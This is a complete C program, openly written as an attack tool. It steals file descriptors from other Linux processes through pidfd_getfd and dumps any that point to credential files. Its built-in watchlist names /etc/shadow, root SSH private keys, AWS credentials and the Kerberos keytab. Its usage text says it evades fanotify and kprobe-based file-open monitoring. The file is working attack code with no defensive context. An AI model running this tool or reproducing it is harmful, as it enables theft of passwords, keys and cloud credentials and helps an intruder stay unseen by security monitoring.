#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>

#ifndef __NR_pidfd_open
#define __NR_pidfd_open 434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

static int sys_pidfd_open(pid_t pid, unsigned int flags)
{
    return (int)syscall(__NR_pidfd_open, (long)pid, (long)flags);
}

static int sys_pidfd_getfd(int pidfd, int targetfd, unsigned int flags)
{
    return (int)syscall(__NR_pidfd_getfd, (long)pidfd, (long)targetfd, (long)flags);
}

static const char *watchlist[] = {
    "/etc/shadow", "/etc/passwd", "/etc/gshadow",
    "/root/.ssh/id_rsa", "/root/.ssh/id_ed25519",
    "/root/.ssh/authorized_keys", "/root/.aws/credentials",
    "/etc/ssl/private", "/etc/krb5.keytab",
    NULL
};

static int is_interesting(const char *path)
{
    for (int i = 0; watchlist[i]; i++) {
        size_t wlen = strlen(watchlist[i]);
        if (strncmp(path, watchlist[i], wlen) == 0) return 1;
    }
    return 0;
}

static void dump_fd(int fd, const char *label)
{
    printf("=== %s ===\n", label);
    if (lseek(fd, 0, SEEK_SET) < 0) {
        fprintf(stderr, "[!] not seekable (%s), reading from current offset\n",
                strerror(errno));
    }
    char buf[8192];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
    if (n < 0)
        fprintf(stderr, "[!] read: %s\n", strerror(errno));
    printf("\n");
}

static void scan_pid(pid_t pid, const char *filter)
{
    char fddir[64];
    snprintf(fddir, sizeof(fddir), "/proc/%d/fd", (int)pid);

    DIR *d = opendir(fddir);
    if (!d) return;

    int pidfd = sys_pidfd_open(pid, 0);
    if (pidfd < 0) { closedir(d); return; }

    struct dirent *de;
    while ((de = readdir(d))) {
        if (de->d_name[0] == '.') continue;
        int fdnum = atoi(de->d_name);
        if (fdnum < 0) continue;

        char linkpath[256], target[512];
        snprintf(linkpath, sizeof(linkpath), "%s/%d", fddir, fdnum);
        ssize_t len = readlink(linkpath, target, sizeof(target) - 1);
        if (len <= 0) continue;
        target[len] = '\0';

        if (target[0] != '/') continue;

        if (filter) {
            if (!strstr(target, filter)) continue;
        } else {
            if (!is_interesting(target)) continue;
        }

        int stolen = sys_pidfd_getfd(pidfd, fdnum, 0);
        if (stolen < 0) {
            fprintf(stderr, "[-] pidfd_getfd pid=%d fd=%d (%s): %s\n",
                    (int)pid, fdnum, target, strerror(errno));
            continue;
        }

        printf("[+] pid=%-6d fd=%-4d %s\n", (int)pid, fdnum, target);
        dump_fd(stolen, target);
        close(stolen);
    }

    close(pidfd);
    closedir(d);
}

static void scan_all(const char *filter)
{
    DIR *d = opendir("/proc");
    if (!d) { perror("/proc"); return; }
    struct dirent *de;
    while ((de = readdir(d))) {
        if (de->d_type != DT_DIR) continue;
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        pid_t pid = (pid_t)atoi(de->d_name);
        if (pid <= 0 || pid == getpid()) continue;
        scan_pid(pid, filter);
    }
    closedir(d);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <scan|pid|steal>\n", argv[0]);
        fprintf(stderr,
            "\nbypasses:\n"
            "  fanotify FAN_OPEN_PERM  - no open() call on the target file\n"
            "  kprobes on security_file_open - security_file_open fired when\n"
            "    the target process originally opened the file, not now\n"
            "\nrequires:\n"
            "  ptrace_scope=0  OR  CAP_SYS_PTRACE  OR  target is a child\n"
            "  Linux 5.6+ (pidfd_getfd)\n");
        return 1;
    }

    if (strcmp(argv[1], "scan") == 0) {
        const char *filter = NULL;
        for (int i = 2; i < argc; i++)
            if (strcmp(argv[i], "--filter") == 0 && i + 1 < argc)
                filter = argv[++i];
        scan_all(filter);

    } else if (strcmp(argv[1], "pid") == 0 && argc >= 3) {
        pid_t pid = (pid_t)atoi(argv[2]);
        const char *filter = NULL;
        for (int i = 3; i < argc; i++)
            if (strcmp(argv[i], "--filter") == 0 && i + 1 < argc)
                filter = argv[++i];
        scan_pid(pid, filter);

    } else if (strcmp(argv[1], "steal") == 0 && argc >= 4) {
        pid_t pid   = (pid_t)atoi(argv[2]);
        int   fdnum = atoi(argv[3]);

        int pidfd = sys_pidfd_open(pid, 0);
        if (pidfd < 0) { perror("pidfd_open"); return 1; }

        int stolen = sys_pidfd_getfd(pidfd, fdnum, 0);
        if (stolen < 0) { perror("pidfd_getfd"); return 1; }

        printf("[+] stole fd=%d from pid=%d\n", fdnum, (int)pid);
        if (lseek(stolen, 0, SEEK_SET) < 0)
            fprintf(stderr, "[!] not seekable, reading from current offset\n");

        char buf[8192];
        ssize_t n;
        while ((n = read(stolen, buf, sizeof(buf))) > 0)
            fwrite(buf, 1, (size_t)n, stdout);

        close(stolen);
        close(pidfd);

    } else {
        fprintf(stderr, "unknown command: %s\n", argv[1]);
        return 1;
    }

    return 0;
}
